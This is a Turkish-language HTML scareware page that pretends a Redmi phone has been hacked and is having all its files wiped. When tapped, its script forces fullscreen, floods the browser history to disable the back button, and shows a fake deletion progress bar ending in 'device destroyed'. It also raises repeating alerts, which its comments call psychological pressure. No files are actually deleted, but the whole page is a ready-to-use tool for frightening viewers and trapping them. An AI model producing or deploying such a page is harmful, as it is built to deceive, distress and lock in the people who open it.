<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SİSTEM GERİ YÜKLENEMEZ HATA</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; touch-action: none; }
        #console { padding: 20px; font-size: 14px; line-height: 1.2; }
        .progress-bar { width: 0%; height: 20px; background: #0f0; margin-top: 10px; transition: width 0.5s; }
        .danger { color: #f00; font-weight: bold; font-size: 18px; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; z-index: 1000; justify-content: center; align-items: center; text-align: center; }
    </style>
</head>
<body onclick="startHack()">

    <div id="console">
        > CİHAZ TESPİT EDİLDİ: REDMI_13_PRO_5G...<br>
        > KERNEL ERİŞİMİ SAĞLANDI...<br>
        > <span class="danger">DİKKAT: TÜM DOSYALAR SİLİNECEK!</span><br>
        > DURDURMAK İÇİN EKRANA DOKUNUN... (YALAN)
    </div>

    <div id="overlay">
        <div>
            <h1 class="danger">SİSTEM SİLİNİYOR...</h1>
            <div style="border: 1px solid #0f0; width: 80%; margin: 0 auto;">
                <div id="bar" class="progress-bar"></div>
            </div>
            <p id="percent">0%</p>
            <p style="font-size: 10px;">/data/user/0/com.android.settings/files...</p>
        </div>
    </div>

    <script>
        function startHack() {
            // 1. Tam Ekran Modu (Çıkışı zorlaştırır)
            document.documentElement.requestFullscreen();
            
            document.getElementById('overlay').style.display = 'flex';
            let width = 0;
            const bar = document.getElementById('bar');
            const percent = document.getElementById('percent');

            // 2. Geri Tuşunu Devre Dışı Bırakma (Sürekli Geçmişe Ekleme)
            setInterval(() => {
                window.history.pushState(null, null, window.location.href);
            }, 1);

            // 3. Sahte Silme İlerlemesi
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:50%;'>CİHAZ İMHA EDİLDİ.</h1>";
                } else {
                    width += Math.random() * 2;
                    if(width > 100) width = 100;
                    bar.style.width = width + '%';
                    percent.innerText = Math.floor(width) + '%';
                }
            }, 200);

            // 4. Kapanmayan Uyarılar (Psikolojik Baskı)
            setInterval(() => {
                alert("Sistem kritik bir hata ile karşılaştı. Dosya silme işlemi durdurulamıyor!");
            }, 8000);
        }
    </script>
</body>
    </html>
